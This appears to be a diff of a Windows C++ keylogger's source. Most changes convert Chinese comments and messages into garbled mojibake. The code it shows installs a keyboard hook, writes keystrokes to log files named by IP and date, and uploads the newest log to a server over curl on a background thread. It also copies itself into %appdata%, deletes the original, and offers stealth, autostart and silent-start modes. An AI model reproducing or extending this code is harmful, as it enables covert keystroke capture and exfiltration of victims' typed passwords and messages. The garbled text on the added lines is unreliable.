@@ -458,18 +458,18 @@ std::string GetLogDirectory()
     {
         std::wstring appdata(path);
         std::wstring logDirW = appdata + L"\\Keylogger";
-        // 确保目录存在
+        // ȷ��Ŀ¼����
         if (!fs::exists(logDirW))
         {
             fs::create_directories(logDirW);
         }
-        // 转换为多字节字符串
+        // ת��Ϊ���ֽ��ַ���
         int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
         std::string logDir(size_needed, 0);
         WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
         return logDir;
     }
-    // 如果失败，返回当前目录
+    // ���ʧ�ܣ����ص�ǰĿ¼
     return ".\\";
 }
 
@@ -477,21 +477,21 @@ std::string MakeOutputFilename()
 {
     std::string ip = GetLocalIPAddress();
     // 将 IP 中可能的非法字符（极少）替换为 '-'
-    for (char& c : ip)
+    for (char &c : ip)
     {
         if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
             c = '-';
     }
     std::string date = GetDateString();
     std::string filename = ip + "_" + date + ".log";
-    // 拼接日志目录
+    // ƴ����־Ŀ¼
     std::string logDir = GetLogDirectory();
     return logDir + "\\" + filename;
 }
 
-// ---------- 上传功能相关函数 ----------
+// ---------- �ϴ�������غ��� ----------
 
-// CURL 回调函数：捕获响应数据
+// CURL �ص�������������Ӧ����
 size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
     size_t newLength = size * nmemb;
     try {
@@ -520,12 +520,12 @@ std::string readFileContent(const std::string& filePath) {
     return buffer;
 }
 
-// 获取程序当前执行目录（注意：此函数用于上传功能，此处保留）
+// ��ȡ����ǰִ��Ŀ¼��ע�⣺�˺��������ϴ����ܣ��˴�������
 std::string getExecutableDir() {
     char exePath[MAX_PATH];
     DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
     if (len == 0) {
-        std::cerr << "获取程序路径失败，错误码: " << GetLastError() << std::endl;
+        std::cerr << "��ȡ����·��ʧ�ܣ�������: " << GetLastError() << std::endl;
         return "";
     }
     std::string path(exePath, len);
@@ -533,44 +533,44 @@ std::string getExecutableDir() {
     return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
 }
 
-// 筛选符合格式的日志文件并返回最新的一个
+// ɸѡ���ϸ�ʽ����־�ļ����������µ�һ��
 std::string findLatestLogFile(const std::string& dir) {
     if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
-        std::cerr << "目录不存在或无效: " << dir << std::endl;
+        std::cerr << "Ŀ¼�����ڻ���Ч: " << dir << std::endl;
         return "";
     }
 
-    // 正则表达式：匹配 <IP>_<YYYYMMDD>.log 格式
+    // �������ʽ��ƥ�� <IP>_<YYYYMMDD>.log ��ʽ
     std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
     std::smatch match;
 
-    std::vector<std::pair<std::string, std::string>> validLogs;  // 存储（文件名，日期）
+    std::vector<std::pair<std::string, std::string>> validLogs;  // �洢���ļ��������ڣ�
 
-    // 遍历目录下的所有文件
+    // ����Ŀ¼�µ������ļ�
     for (const auto& entry : fs::directory_iterator(dir)) {
-        if (entry.is_regular_file()) {  // 只处理文件
+        if (entry.is_regular_file()) {  // ֻ�����ļ�
             std::string fileName = entry.path().filename().string();
             if (std::regex_match(fileName, match, logPattern)) {
-                // 提取日期部分（第2个捕获组）
+                // ��ȡ���ڲ��֣���2�������飩
                 std::string dateStr = match[2].str();
                 validLogs.emplace_back(fileName, dateStr);
-                std::cout << "发现符合格式的日志文件: " << fileName << "（日期: " << dateStr << "）" << std::endl;
+                std::cout << "���ַ��ϸ�ʽ����־�ļ�: " << fileName << "������: " << dateStr << "��" << std::endl;
             }
         }
     }
 
     if (validLogs.empty()) {
-        std::cerr << "未找到符合格式的日志文件（<IP>_<YYYYMMDD>.log）" << std::endl;
+        std::cerr << "δ�ҵ����ϸ�ʽ����־�ļ���<IP>_<YYYYMMDD>.log��" << std::endl;
         return "";
     }
 
-    // 按日期降序排序（最新的日期在前面）
+    // �����ڽ����������µ�������ǰ�棩
     std::sort(validLogs.begin(), validLogs.end(),
         [](const auto& a, const auto& b) {
-            return a.second > b.second;  // 日期字符串直接比较（YYYYMMDD 格式可直接排序）
+            return a.second > b.second;  // �����ַ���ֱ�ӱȽϣ�YYYYMMDD ��ʽ��ֱ������
         });
 
-    // 返回最新文件的完整路径
+    // ���������ļ�������·��
     return dir + "\\" + validLogs[0].first;
 }
 
@@ -620,11 +620,11 @@ std::string api_get() {
     return "";
 }
 
-// 上传文件到服务器
+// �ϴ��ļ���������
 bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
 {
     if (token.empty()) {
-        std::cerr << "token 为空，无法上传" << std::endl;
+        std::cerr << "token Ϊ�գ��޷��ϴ�" << std::endl;
         return false;
     }
 
@@ -635,7 +635,7 @@ bool uploadFile(const std::string& token, const std::string& localFilePath, cons
 
     CURL* curl = curl_easy_init();
     if (!curl) {
-        std::cerr << "curl 初始化失败" << std::endl;
+        std::cerr << "curl ��ʼ��ʧ��" << std::endl;
         return false;
     }
 
@@ -662,50 +662,50 @@ bool uploadFile(const std::string& token, const std::string& localFilePath, cons
     curl_slist_free_all(headers);
 
     if (res != CURLE_OK) {
-        std::cerr << "上传失败: " << curl_easy_strerror(res) << std::endl;
+        std::cerr << "�ϴ�ʧ��: " << curl_easy_strerror(res) << std::endl;
         return false;
     }
-    std::cout << "上传响应: " << response << std::endl;
-    // 可根据需要解析 response 判断是否成功，此处简单认为响应非空即成功
+    std::cout << "�ϴ���Ӧ: " << response << std::endl;
+    // �ɸ�����Ҫ���� response �ж��Ƿ�ɹ����˴�����Ϊ��Ӧ�ǿռ��ɹ�
     return true;
 }
-// 上传最新日志文件的封装函数
+// �ϴ�������־�ļ��ķ�װ����
 void uploadLatestLog()
 {
-    // 1. 获取 token
+    // 1. ��ȡ token
     std::string token = api_get();
     if (token.empty()) {
-        std::cerr << "获取 token 失败，跳过上传" << std::endl;
-        ShowToastNotification(L"上传错误", L"获取登录凭证失败，已自动关闭上传功能");
+        std::cerr << "��ȡ token ʧ�ܣ������ϴ�" << std::endl;
+        ShowToastNotification(L"�ϴ�����", L"��ȡ��¼ƾ֤ʧ�ܣ����Զ��ر��ϴ�����");
         uploadEnabled = false;
         uploadThreadRunning = false;
         return;
     }
 
-    // 2. 获取日志目录
+    // 2. ��ȡ��־Ŀ¼
     std::string logDir = GetLogDirectory();
     if (logDir.empty()) return;
 
-    // 3. 查找最新的日志文件
+    // 3. �������µ���־�ļ�
     std::string latestLogPath = findLatestLogFile(logDir);
     if (latestLogPath.empty()) return;
 
-    // 4. 配置服务器路径
+    // 4. ���÷�����·��
     fs::path logPath(latestLogPath);
     std::string fileName = logPath.filename().string();
     std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;
 
-    // 5. 上传文件
+    // 5. �ϴ��ļ�
     bool success = uploadFile(token, latestLogPath, serverFile);
     if (!success) {
-        std::cerr << "上传失败，已自动关闭上传功能" << std::endl;
-        ShowToastNotification(L"上传错误", L"文件上传失败，已自动关闭上传功能");
+        std::cerr << "�ϴ�ʧ�ܣ����Զ��ر��ϴ�����" << std::endl;
+        ShowToastNotification(L"�ϴ�����", L"�ļ��ϴ�ʧ�ܣ����Զ��ر��ϴ�����");
         uploadEnabled = false;
         uploadThreadRunning = false;
     }
 }
 
-// 上传线程函数
+// �ϴ��̺߳���
 DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
 {
     while (uploadEnabled && uploadThreadRunning)
@@ -717,7 +717,7 @@ DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
     uploadThreadRunning = false;
     return 0;
 }
-// ---------- 键盘钩子回调函数 ----------
+// ---------- ���̹��ӻص����� ----------
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0)
@@ -734,77 +734,77 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 isRecording = !isRecording;
                 if (isRecording)
                 {
-                    std::cout << "录制继续\n";
-                    ShowToastNotification(L"继续录(/≧▽≦)/", L"录制继续");
+                    std::cout << "¼�Ƽ���\n";
+                    ShowToastNotification(L"����¼(/�R���Q)/", L"¼�Ƽ���");
                 }
                 else
                 {
-                    std::cout << "录制暂停\n";
-                    ShowToastNotification(L"不录啦╰(￣ω￣ｏ)", L"录制暂停");
+                    std::cout << "¼����ͣ\n";
+                    ShowToastNotification(L"��¼���t(���أ���)", L"¼����ͣ");
                 }
             }
             // Check for Ctrl + Shift + Alt + Q
             else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
-                ShowToastNotification(L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束");
-                std::cout << "录制结束\n";
+                ShowToastNotification(L"�治¼����*�b�`�b*��\n\n�ǰݰ���(o�b���b)o��", L"¼�ƽ���");
+                std::cout << "¼�ƽ���\n";
                 Sleep(2000);
-                CleanupNotifyIcon();   // 清理托盘图标
+                CleanupNotifyIcon();   // ��������ͼ��
                 ReleaseHook();
                 output_file.close();
                 exit(0);
             }
-            // Check for Ctrl + Shift + Alt + S (开机自启)
+            // Check for Ctrl + Shift + Alt + S (��������)
             else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
                 bool enabled = IsAutoStartEnabled();
                 if (SetAutoStart(!enabled))
                 {
                     if (!enabled)
-                        ShowToastNotification(L"已设置为开机自啟 awa", L"自启设置");
+                        ShowToastNotification(L"������Ϊ�����Ԇ� awa", L"��������");
                     else
-                        ShowToastNotification(L"已取消开机自启 qaq", L"自启设置");
+                        ShowToastNotification(L"��ȡ���������� qaq", L"��������");
                 }
                 else
                 {
-                    ShowToastNotification(L"自启设置失败，请以管理员身份运行w", L"自启设置");
+                    ShowToastNotification(L"��������ʧ�ܣ����Թ���Ա��������w", L"��������");
                 }
             }
-            // Check for Ctrl + Shift + Alt + D (静默启动)
+            // Check for Ctrl + Shift + Alt + D (��Ĭ����)
             else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
                 bool silent = IsSilentMode();
                 if (SetSilentMode(!silent))
                 {
                     if (!silent)
-                        ShowToastNotification(L"已设置为静默启动（下次启动不再弹窗）", L"静默启动");
+                        ShowToastNotification(L"������Ϊ��Ĭ�������´��������ٵ�����", L"��Ĭ����");
                     else
-                        ShowToastNotification(L"已取消静默启动（下次启动会弹窗）", L"静默启动");
+                        ShowToastNotification(L"��ȡ����Ĭ�������´������ᵯ����", L"��Ĭ����");
                 }
                 else
                 {
-                    ShowToastNotification(L"设置静默启动失败，请以管理员身份运行", L"静默启动");
+                    ShowToastNotification(L"���þ�Ĭ����ʧ�ܣ����Թ���Ա��������", L"��Ĭ����");
                 }
             }
-            // Check for Ctrl + Shift + Alt + U (上传开关)
+            // Check for Ctrl + Shift + Alt + U (�ϴ�����)
             else if (kbdStruct.vkCode == 'U' && (GetKeyState(VK_CONTROL) & 0x8000) &&
                 (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
                 bool newState = !uploadEnabled;
                 if (newState)
                 {
-                    // 如果线程未运行（可能之前因错误关闭），则启动新线程
+                    // ����߳�δ���У�����֮ǰ�����رգ������������߳�
                     if (!uploadThreadRunning)
                     {
                         uploadThreadRunning = true;
                         hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
                         if (hUploadThread)
                             CloseHandle(hUploadThread);
-                        ShowToastNotification(L"上传开关", L"上传功能已开启，将定期上传日志文件");
+                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������������ϴ���־�ļ�");
                     }
                     else
                     {
-                        ShowToastNotification(L"上传开关", L"上传功能已开启（线程已在运行）");
+                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������߳��������У�");
                     }
                     uploadEnabled = true;
                 }
@@ -814,7 +814,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                     uploadThreadRunning = false;
                     if (hUploadThread)
                         WaitForSingleObject(hUploadThread, 5000);
-                    ShowToastNotification(L"上传开关", L"上传功能已关闭");
+                    ShowToastNotification(L"�ϴ�����", L"�ϴ������ѹر�");
                 }
             }
             else
@@ -842,12 +842,12 @@ void SetHook()
     }
 }
 
-// ==================== 新增功能：自复制、删除原文件、创建快捷方式 ====================
+// ==================== �������ܣ��Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ ====================
 
-// 创建快捷方式（通用）
+// ������ݷ�ʽ��ͨ�ã�
 bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
 {
-    // 如果快捷方式已存在，则不重复创建
+    // �����ݷ�ʽ�Ѵ��ڣ����ظ�����
     if (fs::exists(shortcutPath))
         return true;
 
@@ -871,10 +871,10 @@ bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcut
     return SUCCEEDED(hr);
 }
 
-// 处理自复制、删除原文件、创建快捷方式
+// �����Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ
 void HandleSelfCopyAndDelete()
 {
-    // 获取目标目录：%appdata%\Keylogger
+    // ��ȡĿ��Ŀ¼��%appdata%\Keylogger
     wchar_t appdataPath[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
         return;
@@ -885,23 +885,23 @@ void HandleSelfCopyAndDelete()
     std::wstring currentExe = GetModulePath();
     std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();
 
-    // 如果当前程序不在目标目录，则执行复制、创建快捷方式、启动、删除
+    // �����ǰ������Ŀ��Ŀ¼����ִ�и��ơ�������ݷ�ʽ��������ɾ��
     if (currentExe != targetExe)
     {
-        // 复制自身到目标目录
+        // ����������Ŀ��Ŀ¼
         if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
         {
-            MessageBoxW(NULL, L"复制自身到 %appdata%\\Keylogger 失败", L"错误", MB_ICONERROR);
+            MessageBoxW(NULL, L"���������� %appdata%\\Keylogger ʧ��", L"����", MB_ICONERROR);
             return;
         }
 
-        // 在原程序所在目录创建指向新程序的快捷方式
+        // ��ԭ��������Ŀ¼����ָ���³���Ŀ�ݷ�ʽ
         std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
         std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
         std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
         CreateShortcut(targetExe, shortcutPath);
 
-        // 启动新程序，传递原程序路径以便删除
+        // �����³��򣬴���ԭ����·���Ա�ɾ��
         std::wstring params = L"--delete-old \"" + currentExe + L"\"";
         wchar_t paramsBuf[1024];
         wcscpy_s(paramsBuf, params.c_str());
@@ -912,40 +912,40 @@ void HandleSelfCopyAndDelete()
         {
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
-            ExitProcess(0);   // 当前进程退出
+            ExitProcess(0);   // ��ǰ�����˳�
         }
         else
         {
-            MessageBoxW(NULL, L"启动副本失败", L"错误", MB_ICONERROR);
+            MessageBoxW(NULL, L"��������ʧ��", L"����", MB_ICONERROR);
         }
     }
     else
     {
-        // 已经在目标目录，检查是否有删除旧文件的任务
+        // �Ѿ���Ŀ��Ŀ¼������Ƿ���ɾ�����ļ�������
         int argc;
         LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
         if (argc >= 3 && wcscmp(argv[1], L"--delete-old") == 0)
         {
             std::wstring oldPath = argv[2];
-            // 等待原程序完全退出（增加延迟）
-            Sleep(5000);  // 5秒，足够原进程退出
+            // �ȴ�ԭ������ȫ�˳��������ӳ٣�
+            Sleep(5000);  // 5�룬�㹻ԭ�����˳�
 
-            // 尝试删除，重试多次
+            // ����ɾ�������Զ��
             bool deleted = false;
             DWORD lastError = 0;
             for (int i = 0; i < 10; ++i)
             {
-                // 检查文件是否存在
+                // ����ļ��Ƿ����
                 if (!fs::exists(oldPath))
                 {
                     deleted = true;
                     break;
                 }
 
-                // 移除只读属性（如果有）
+                // �Ƴ�ֻ�����ԣ�����У�
                 SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);
 
-                // 尝试删除
+                // ����ɾ��
                 if (DeleteFileW(oldPath.c_str()))
                 {
                     deleted = true;
@@ -953,7 +953,7 @@ void HandleSelfCopyAndDelete()
                 }
 
                 lastError = GetLastError();
-                // 如果文件被占用，等待重试
+                // ����ļ���ռ�ã��ȴ�����
                 if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
                 {
                     Sleep(1000);
@@ -961,49 +961,49 @@ void HandleSelfCopyAndDelete()
                 }
                 else
                 {
-                    // 其他错误，跳出重试
+                    // ����������������
                     break;
                 }
             }
 
             if (!deleted)
             {
-                // 如果常规删除失败，尝试延迟删除（重启后删除）
+                // �������ɾ��ʧ�ܣ������ӳ�ɾ����������ɾ����
                 if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
                 {
                     lastError = GetLastError();
                     wchar_t msg[512];
-                    wsprintfW(msg, L"删除原程序失败，错误码：%lu\n路径：%s\n已设置延迟删除（重启后生效）", lastError, oldPath.c_str());
-                    MessageBoxW(NULL, msg, L"删除错误", MB_ICONERROR);
+                    wsprintfW(msg, L"ɾ��ԭ����ʧ�ܣ������룺%lu\n·����%s\n�������ӳ�ɾ������������Ч��", lastError, oldPath.c_str());
+                    MessageBoxW(NULL, msg, L"ɾ������", MB_ICONERROR);
                 }
                 else
                 {
-                    // 延迟删除成功，通知用户
-                    MessageBoxW(NULL, L"原程序将在下次重启时被删除。", L"提示", MB_ICONINFORMATION);
+                    // �ӳ�ɾ���ɹ���֪ͨ�û�
+                    MessageBoxW(NULL, L"ԭ�������´�����ʱ��ɾ����", L"��ʾ", MB_ICONINFORMATION);
                 }
             }
         }
         if (argv) LocalFree(argv);
     }
 }
-// ==================== 主函数 ====================
+// ==================== ������ ====================
 int main()
 {
-    // 首先处理自复制与删除旧文件（必须在 Stealth 之前，因为可能涉及退出进程）
+    // ���ȴ����Ը�����ɾ�����ļ��������� Stealth ֮ǰ����Ϊ�����漰�˳����̣�
     HandleSelfCopyAndDelete();
 
     Stealth();
 
-    // 静默模式提示（如果未开启静默模式则显示启动提示）
+    // ��Ĭģʽ��ʾ�����δ������Ĭģʽ����ʾ������ʾ��
     if (!IsSilentMode()) {
-        MessageBoxW(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\n"
-            L"Ctrl + Shift + Alt + P  暂停录制\n"
-            L"Ctrl + Shift + Alt + Q  结束录制\n"
-            L"Ctrl + Shift + Alt + S  设置/取消开机自启\n"
-            L"Ctrl + Shift + Alt + D  设置/取消静默启动\n"
-            L"Ctrl + Shift + Alt + U  开启/关闭上传功能\n\n"
-            L"录制日志将保存在 %appdata%\\Keylogger 目录，文件名 ip_日期.log",
-            L"录制开始", MB_OK);
+        MessageBoxW(NULL, L"��¼ q(�R���Qq)\n\n��ݼ�С��ʾww\n"
+            L"Ctrl + Shift + Alt + P  ��ͣ¼��\n"
+            L"Ctrl + Shift + Alt + Q  ����¼��\n"
+            L"Ctrl + Shift + Alt + S  ����/ȡ����������\n"
+            L"Ctrl + Shift + Alt + D  ����/ȡ����Ĭ����\n"
+            L"Ctrl + Shift + Alt + U  ����/�ر��ϴ�����\n\n"
+            L"¼����־�������� %appdata%\\Keylogger Ŀ¼���ļ��� ip_����.log",
+            L"¼�ƿ�ʼ", MB_OK);
     }
 
 #ifdef bootwait 
@@ -1017,7 +1017,7 @@ int main()
     std::cout << "跳过系统启动检查。\n";
 #endif
 
-    // 确保日志目录存在
+    // ȷ����־Ŀ¼����
     GetLogDirectory();
 
     std::string output_filename = MakeOutputFilename();
